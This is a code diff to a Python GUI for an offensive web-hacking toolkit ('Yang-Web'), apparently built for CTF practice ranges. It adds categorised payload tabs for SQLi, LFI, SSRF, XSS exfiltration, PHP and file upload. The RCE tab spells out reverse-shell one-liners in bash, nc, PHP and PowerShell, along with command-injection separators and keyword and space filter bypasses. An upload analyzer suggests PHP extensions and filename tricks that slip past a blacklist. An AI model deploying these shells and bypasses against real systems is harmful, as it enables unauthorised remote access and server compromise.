@@ -98,9 +98,9 @@ def _entry(parent, width=60):
     e.pack(fill=tk.X, pady=(2, 6), ipady=4)
     return e
 
-def _combo(parent, values, default=None):
+def _combo(parent, values, default=None, **kw):
     cb = ttk.Combobox(parent, values=values, state="readonly",
-                      font=("Cascadia Code", 10))
+                      font=("Cascadia Code", 10), **kw)
     if default:
         cb.set(default)
     cb.pack(fill=tk.X, pady=(2, 6))
@@ -112,9 +112,9 @@ def _output_area(parent, height=18):
 
 def _append(txt_widget, text, tag=None):
     txt_widget.configure(state="normal")
+    if not text.endswith('\n'):
+        text = text + '\n'
     txt_widget.insert(tk.END, text)
-    if tag:
-        txt_widget.insert(tk.END, "\n")
     txt_widget.configure(state="disabled")
     txt_widget.see(tk.END)
 
@@ -342,22 +342,27 @@ class DecodePanel(tk.Frame):
 
 class PayloadPanel(tk.Frame):
     """通用 Payload 面板"""
-    def __init__(self, parent, title, emoji, get_data_fn, search_fn=None):
+    def __init__(self, parent, title, emoji, get_data_fn, search_fn=None, analyzer_fn=None):
         super().__init__(parent, bg=BG)
         self.get_data = get_data_fn
         self.search_fn = search_fn
+        self.analyzer_fn = analyzer_fn
 
         _label(self, f"{emoji} {title}", fg=ACCENT, font_size=16, bold=True, pady=8)
 
-        # 分类选择
-        top = tk.Frame(self, bg=BG)
-        top.pack(fill=tk.X, pady=4)
-        _label(top, "分类:", pady=0)
-        self.category_var = tk.StringVar()
-        self.category_combo = _combo(top, ["全部"])
-        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())
-        top.pack_forget()
-        self.top_frame = top
+        # 靶场分析条 (Upload 专用)
+        if analyzer_fn:
+            analyze_frame = tk.Frame(self, bg=DARK)
+            analyze_frame.pack(fill=tk.X, padx=4, pady=(0,4))
+            _label(analyze_frame, "🎯 分析:", fg=ACCENT, pady=0, font_size=11)
+            self.analyze_entry = tk.Entry(analyze_frame, bg=INPUT_BG, fg=FG,
+                insertbackground=ACCENT, relief="flat", borderwidth=0,
+                font=("Cascadia Code", 11))
+            self.analyze_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=6, ipady=4)
+            self.analyze_entry.bind("<Return>", lambda e: self._do_analyze())
+            tk.Button(analyze_frame, text="分析", command=self._do_analyze,
+                bg=ACCENT, fg=DARK, relief="flat", padx=14, pady=4,
+                cursor="hand2", font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(2,0))
 
         # 搜索
         search_frame = tk.Frame(self, bg=BG)
@@ -370,26 +375,53 @@ class PayloadPanel(tk.Frame):
                   relief="flat", padx=12, pady=4, cursor="hand2",
                   font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)
 
+        # 分类选择 (搜索下方)
+        top = tk.Frame(self, bg=BG)
+        top.pack(fill=tk.X, pady=4)
+        _label(top, "分类:", pady=0)
+        self.category_var = tk.StringVar(value="-- 选择分类 --")
+        self.category_combo = _combo(top, ["-- 选择分类 --"], textvariable=self.category_var)
+        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())
+        self.top_frame = top
+
         self.output_frame, self.output = _output_area(self, 22)
         self.output_frame.pack(fill=tk.BOTH, expand=True)
-        self._refresh()
+        _append(self.output, "👆 请在上方选择一个分类查看 Payload")
 
     def _refresh(self):
         _clear_output(self.output)
         cat = self.category_var.get()
+        if not cat or cat == "-- 选择分类 --":
+            _append(self.output, "👆 请在上方选择一个分类查看 Payload")
+            return
         try:
-            data = self.get_data(cat if cat and cat != "全部" else "")
+            data = self.get_data(cat)
             self._display(data)
         except Exception as e:
             _append(self.output, f"❌ 错误: {e}")
+
+    def _do_analyze(self):
+        """运行靶场分析."""
+        if not self.analyzer_fn:
+            return
+        blacklist = self.analyze_entry.get().strip()
+        if not blacklist:
+            _clear_output(self.output)
+            _append(self.output, "👆 请在上方输入靶场黑名单 (如: php,php3,php5)")
+            return
+        _clear_output(self.output)
+        try:
+            result = self.analyzer_fn(blacklist)
+            _append(self.output, result)
+        except Exception as e:
+            _append(self.output, f"❌ 分析出错: {e}")
 
     def _display(self, data):
         if isinstance(data, dict):
             for key, items in data.items():
                 _append(self.output, f"\n▸ {key}\n")
                 if isinstance(items, list):
-                    show = items[:20] if len(items) > 20 else items
-                    for item in show:
+                    for item in items:
                         if isinstance(item, str):
                             _append(self.output, f"  • {item}")
                         elif isinstance(item, dict):
@@ -398,8 +430,14 @@ class PayloadPanel(tk.Frame):
                                 _append(self.output, f"    {item['payload'][:150]}")
                             if 'tip' in item:
                                 _append(self.output, f"    💡 {item['tip'][:120]}")
-                    if len(items) > 20:
-                        _append(self.output, f"  ... 还有 {len(items)-20} 项")
+                elif isinstance(items, dict):
+                    for sub_key, sub_items in items.items():
+                        if isinstance(sub_items, list):
+                            _append(self.output, f"  ▸ {sub_key}:")
+                            for item in sub_items:
+                                _append(self.output, f"    • {str(item)[:200]}")
+                        else:
+                            _append(self.output, f"  ▸ {sub_key}: {sub_items}")
                 else:
                     _append(self.output, f"  {items}")
 
@@ -422,9 +460,8 @@ class PayloadPanel(tk.Frame):
             _append(self.output, f"未找到包含 '{kw}' 的结果")
 
     def set_categories(self, categories):
-        self.category_combo["values"] = ["全部"] + list(categories)
-        self.category_combo.set("全部")
-        self.top_frame.pack(fill=tk.X, pady=4)
+        self.category_combo["values"] = ["-- 选择分类 --"] + list(categories)
+        self.category_combo.set("-- 选择分类 --")
 
 
 class HashPanel(tk.Frame):
@@ -1228,61 +1265,170 @@ def run_gui():
     notebook.add(decode_panel, text=" 🔓 解码 ")
 
     # Payload 面板们
-    def _add_payload_tab(title, emoji, module, get_fn, search_fn=None):
-        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn)
-        if hasattr(module, 'EXPLOIT') and module.EXPLOIT:
-            panel.set_categories(module.EXPLOIT.keys())
-        elif hasattr(module, 'EXT_BYPASS'):
-            panel.set_categories(["后缀绕过", "MIME伪造", "内容绕过", "解析漏洞", "高级技巧"])
+    def _add_payload_tab(title, emoji, get_fn, categories=None, search_fn=None, analyzer_fn=None):
+        """Add a payload tab with optional category dropdown."""
+        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn, analyzer_fn)
+        if categories:
+            panel.set_categories(categories)
         notebook.add(panel, text=f" {emoji} {title} ")
         return panel
 
-    _add_payload_tab("SSTI", "🎨", ssti, ssti.get_exploit)
-    _add_payload_tab("SQLi", "🗄️", sqli, sqli.get_exploit, sqli.search_payload)
-    _add_payload_tab("LFI", "📂", lfi, lfi.get_path_traversal)
-    _add_payload_tab("SSRF", "🌐", ssrf, ssrf.get_cloud_metadata)
-    _add_payload_tab("XSS", "💉", xss, xss.get_detection)
-    _add_payload_tab("PHP", "🐘", php, lambda _: {
-        "Magic Hash": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15],
-        "弱类型比较": [i["example"] for items in php.TYPE_JUGGLING.values() for i in items],
-        "RCE Bypass": php.PHP_RCE_BYPASS.get("常见命令执行函数", [])[:15],
-    })
+    _add_payload_tab("SSTI", "🎨", ssti.get_exploit,
+                     categories=list(ssti.EXPLOIT.keys()))
+    _add_payload_tab("SQLi", "🗄️", sqli.get_exploit,
+                     categories=list(sqli.EXPLOIT.keys()),
+                     search_fn=sqli.search_payload)
 
-    # Upload
-    def _upload_get(_):
-        return {
-            "后缀绕过": upload.EXT_BYPASS.get("黑名单未覆盖后缀", []),
-            "大小写混合": upload.EXT_BYPASS.get("大小写混合", []),
-            "多后缀": upload.EXT_BYPASS.get("多后缀组合", []),
-            "空格点(Win)": upload.EXT_BYPASS.get("空格/点技巧 (Win)", []),
-            "NTFS流": upload.EXT_BYPASS.get("NTFS 数据流 (Win)", []),
-            "图片马内容绕过": [p for items in upload.CONTENT_BYPASS.values() for p in items[:3]],
-            "一句话图片马": [
-                upload.generate_image_shell("eval"),
-                upload.generate_image_shell("system"),
-                upload.generate_image_shell("one_liner"),
-            ],
-            ".htaccess/.user.ini": [
-                upload.generate_htaccess(),
-                upload.generate_userini(),
-                upload.generate_userini("shell.jpg"),
-            ],
+    # ── LFI ──
+    def _lfi_get(cat):
+        data = {
+            "路径遍历": {"路径遍历Payload": lfi.get_path_traversal()},
+            "敏感文件(Linux)": lfi.get_sensitive_files("Linux"),
+            "敏感文件(Windows)": lfi.get_sensitive_files("Windows"),
+            "PHP伪协议": lfi.get_php_wrappers(),
         }
-    _add_payload_tab("Upload", "📤", upload, _upload_get)
+        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
+    _add_payload_tab("LFI", "📂", _lfi_get,
+                     categories=["路径遍历", "敏感文件(Linux)", "敏感文件(Windows)", "PHP伪协议"])
 
-    # RCE
-    def _rce_get(_):
-        return {
-            "反弹Shell": ["bash -i >& /dev/tcp/IP/PORT 0>&1",
-                          "nc -e /bin/sh IP PORT",
-                          "python -c 'import socket,subprocess,os;...'",
-                          "php -r '$sock=fsockopen(...);'",
-                          "powershell -c \"$c=New-Object ...\""],
-            "命令注入链接符": [";", "|", "||", "&&", "&", "\\n", "%0a", "`"],
-            "空格绕过": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09"],
-            "关键字绕过": ["c''at", "c\\at", "ca$*t", "/???/c?t"],
+    # ── SSRF ──
+    def _ssrf_get(cat):
+        data = {
+            "云元数据": ssrf.get_cloud_metadata(),
+            "绕过技巧": {"SSRF Bypass": ssrf.get_bypass()},
+            "常见端口": ssrf.get_common_ports(),
+            "内网地址": {"内网IP段": ssrf.get_internal_ranges()},
         }
-    _add_payload_tab("RCE", "💻", None, _rce_get)
+        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
+    _add_payload_tab("SSRF", "🌐", _ssrf_get,
+                     categories=["云元数据", "绕过技巧", "常见端口", "内网地址"])
+
+    # ── XSS ──
+    def _xss_get(cat):
+        data = {
+            "检测Payload": {"XSS检测": xss.get_detection()},
+            "数据外传": {"Exfiltration": xss.get_exfiltration()},
+            "WAF绕过": xss.get_bypass(),
+        }
+        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
+    _add_payload_tab("XSS", "💉", _xss_get,
+                     categories=["检测Payload", "数据外传", "WAF绕过"])
+
+    # ── PHP ──
+    def _php_get(cat):
+        data = {
+            "Magic Hash": {"MD5(0e...)": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15]},
+            "弱类型比较": {k: [i.get("example", str(i)) for i in v]
+                        for k, v in php.TYPE_JUGGLING.items()},
+            "RCE Bypass": {"常见绕过": php.PHP_RCE_BYPASS.get("常见命令执行函数", [])[:15]},
+        }
+        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
+    _add_payload_tab("PHP", "🐘", _php_get,
+                     categories=["Magic Hash", "弱类型比较", "RCE Bypass"])
+
+    # ── Upload ──
+    def _upload_get(cat):
+        """Get upload payloads, filtered by category."""
+        ext_sections = {}
+        for k, v in upload.EXT_BYPASS.items():
+            ext_sections[k] = v
+        mime_items = []
+        for k, v in upload.MIME_HEADER_FAKE.items():
+            mime_items.append(f"{k}: Content-Type={v['Content-Type']}  |  文件头={v['文件头hex']}")
+        content_sections = {}
+        for k, v in upload.CONTENT_BYPASS.items():
+            content_sections[k] = v
+        all_data = {
+            "后缀绕过": ext_sections,
+            "大小写混淆": {"大小写混合": upload.EXT_BYPASS.get("大小写混合", [])},
+            "多后缀组合": {"多后缀组合": upload.EXT_BYPASS.get("多后缀组合", [])},
+            "NTFS & 空格点": {
+                "NTFS 数据流": upload.EXT_BYPASS.get("NTFS 数据流 (Win)", []),
+                "空格/点技巧": upload.EXT_BYPASS.get("空格/点技巧 (Win)", []),
+            },
+            "路径截断": {"路径截断": upload.EXT_BYPASS.get("路径截断", [])},
+            "MIME伪造": {"Content-Type & 文件头": mime_items},
+            "图片马内容绕过": content_sections,
+            "一句话木马": {
+                "eval版": [upload.generate_image_shell("eval")],
+                "system版": [upload.generate_image_shell("system")],
+                "极简版": [upload.generate_image_shell("one_liner")],
+            },
+            ".htaccess/.user.ini": {
+                ".htaccess": [upload.generate_htaccess()],
+                ".user.ini": [upload.generate_userini(), upload.generate_userini("shell.jpg")],
+            },
+            "高级技巧": {},
+        }
+        try:
+            if hasattr(upload, 'ADVANCED_BYPASS'):
+                all_data["高级技巧"] = upload.ADVANCED_BYPASS
+        except Exception:
+            pass
+        try:
+            if hasattr(upload, 'get_parse_vuln'):
+                all_data["解析漏洞"] = upload.get_parse_vuln()
+        except Exception:
+            pass
+        return all_data if not cat or cat == "全部" else {cat: all_data.get(cat, {})}
+    def _upload_analyze(blacklist_str):
+        """GUI 靶场黑名单分析."""
+        import re
+        ALL_EXTS = {'php','php3','php4','php5','php7','php8','phtml','pht','phps','phar','shtml','cgi'}
+        blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))
+        
+        lines = []
+        lines.append(f"🎯 靶场黑名单分析")
+        lines.append(f"  已拦截: {', '.join(sorted(blocked))}")
+        
+        safe = sorted(ALL_EXTS - blocked)
+        if safe:
+            lines.append(f"")
+            lines.append(f"✅ 可用后缀 (不在黑名单):")
+            for ext in safe:
+                marker = " ⭐推荐" if ext in ('pht','phtml') else ""
+                lines.append(f"  • .{ext}{marker}")
+        else:
+            lines.append(f"\n❌ 所有常见后缀均在黑名单中")
+        
+        lines.append(f"")
+        lines.append(f"🔤 大小写混合策略:")
+        for v in ['Php','pHp','PHP','pHp5','PhP']:
+            ext = v.lower()
+            tag = "✅" if ext in blocked else "⚪"
+            lines.append(f"  {tag} {v}")
+        
+        lines.append(f"")
+        lines.append(f"📦 其他绕过:")
+        lines.append(f"  • 双后缀: shell.php.jpg")
+        lines.append(f"  • NTFS数据流: shell.php::$DATA")
+        lines.append(f"  • 空格/点: shell.php .  (Windows)")
+        
+        return '\n'.join(lines)
+
+    _add_payload_tab("Upload", "📤", _upload_get,
+                     categories=["后缀绕过", "大小写混淆", "多后缀组合", "NTFS & 空格点",
+                                  "路径截断", "MIME伪造", "图片马内容绕过", "一句话木马",
+                                  ".htaccess/.user.ini", "解析漏洞", "高级技巧"],
+                     analyzer_fn=_upload_analyze)
+
+    # ── RCE ──
+    def _rce_get(cat):
+        data = {
+            "反弹Shell": {"各语言反弹Shell": [
+                "bash -i >& /dev/tcp/IP/PORT 0>&1",
+                "nc -e /bin/sh IP PORT",
+                "python3 -c 'import socket,subprocess,os;s=socket.socket();...'",
+                "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',PORT)...\"",
+            ]},
+            "命令注入链接符": {"链接符": [";", "|", "||", "&&", "&", "%0a", "`", "$(cmd)"]},
+            "空格绕过": {"绕过技巧": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09", "%20"]},
+            "关键字绕过": {"绕过技巧": ["c''at", "c\\at", "ca$*t", "/???/c?t", "c'a't"]},
+        }
+        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}
+    _add_payload_tab("RCE", "💻", _rce_get,
+                     categories=["反弹Shell", "命令注入链接符", "空格绕过", "关键字绕过"])
 
     # Hash
     notebook.add(HashPanel(notebook), text=" 🔍 Hash ")
@@ -1464,7 +1610,7 @@ def run_gui():
     status = tk.Frame(root, bg=DARK, height=28)
     status.pack(fill=tk.X, side=tk.BOTTOM)
     status.pack_propagate(False)
-    tk.Label(status, text="Yang-Web v1.3.2  |  GUI+CLI 双模式  |  41 scripts  |  💻 按钮切换",
+    tk.Label(status, text="Yang-Web v1.4.0  |  GUI+CLI 双模式  |  上传靶场分析 + SQLi认证绕过  |  💻 切换",
              bg=DARK, fg=BORDER, font=("Microsoft YaHei UI", 8)).pack(side=tk.LEFT, padx=16, pady=4)
 
     root.mainloop()
